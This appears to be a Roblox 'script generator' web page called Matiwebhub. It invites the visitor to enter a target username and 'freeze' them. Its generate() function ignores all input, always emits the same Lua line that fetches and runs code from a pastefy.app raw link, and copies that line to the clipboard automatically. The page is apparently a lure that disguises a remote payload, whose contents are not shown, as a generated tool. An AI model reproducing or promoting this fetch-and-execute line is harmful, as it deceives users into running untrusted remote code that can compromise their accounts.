<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matiwebhub | Premium</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0a0a0c; color: #fff; font-family: sans-serif; }
        .panel { background: #121217; border: 1px solid #1f1f27; }
        .input-dark { background: #1c1c24; border: 1px solid #2d2d39; color: white; }
        .btn-blue { background: #4f46e5; font-weight: bold; }
        .btn-blue:disabled { background: #1c1c24; color: #444; }
        .avatar-container { border: 2px solid #4f46e5; box-shadow: 0 0 10px rgba(79, 70, 229, 0.5); }
    </style>
</head>
<body class="p-4 flex justify-center min-h-screen">
    <div class="max-w-md w-full space-y-6">
        
        <div class="flex flex-col items-center space-y-2">
            <div class="bg-green-500/10 text-green-500 border border-green-500/20 px-3 py-1 rounded-full text-[10px] font-bold">
                LIVE · Script Generator Online
            </div>
            <h1 class="text-4xl font-black italic uppercase text-white tracking-tighter">MATIWEBHUB</h1>
        </div>

        <div class="panel p-6 rounded-2xl space-y-4">
            <label class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Roblox Username</label>
            <input type="text" id="userInput" oninput="fetchAvatar()" placeholder="Enter username..." 
                   class="w-full p-4 rounded-xl input-dark text-sm outline-none focus:border-indigo-500">
            
            <div id="profileBox" class="hidden">
                <div onclick="selectProfile()" class="flex items-center space-x-4 p-4 border border-indigo-500 bg-indigo-500/10 rounded-xl cursor-pointer">
                    <div class="w-14 h-14 rounded-full bg-black overflow-hidden avatar-container">
                        <img id="avatarImg" class="w-full h-full object-cover" src="">
                    </div>
                    <div>
                        <p id="targetName" class="text-sm font-bold text-white"></p>
                        <p id="statusText" class="text-[9px] text-indigo-400 font-bold uppercase">PROFILE FOUND</p>
                    </div>
                </div>
            </div>
        </div>

        <div class="space-y-3">
            <button id="freezeBtn" disabled class="w-full p-4 rounded-xl bg-gray-800 text-[11px] font-black uppercase text-gray-500">
                SCRIPT FREEZE
            </button>
            <button id="genBtn" onclick="generate()" disabled class="w-full p-5 rounded-xl btn-blue text-[12px] font-black uppercase tracking-widest">
                GENERATE SCRIPT
            </button>
        </div>

        <div id="output" class="hidden panel p-5 rounded-2xl border-indigo-500/30">
            <code id="scriptCode" class="text-[10px] break-all text-indigo-200 font-mono"></code>
        </div>
    </div>

    <script>
        function fetchAvatar() {
            const user = document.getElementById('userInput').value;
            const box = document.getElementById('profileBox');
            const img = document.getElementById('avatarImg');
            const name = document.getElementById('targetName');

            if(user.length > 2) {
                box.classList.remove('hidden');
                name.textContent = user;
                // Usamos el endpoint de 'headshot-thumbnail' que es el más estable
                img.src = `https://www.roblox.com/headshot-thumbnail/image?userName=${user}&width=150&height=150&format=png`;
            } else {
                box.classList.add('hidden');
            }
        }

        function selectProfile() {
            document.getElementById('statusText').textContent = "SELECTED ✅";
            document.getElementById('freezeBtn').disabled = false;
            document.getElementById('freezeBtn').classList.replace('text-gray-500', 'text-white');
            document.getElementById('freezeBtn').classList.replace('bg-gray-800', 'bg-indigo-700');
            document.getElementById('genBtn').disabled = false;
        }

        function generate() {
            const code = 'loadstring(game:HttpGet("https://pastefy.app/e8DClYOX/raw"))()';
            document.getElementById('scriptCode').textContent = code;
            document.getElementById('output').classList.remove('hidden');
            navigator.clipboard.writeText(code);
            alert("Script copiado!");
        }
    </script>
</body>
</html>
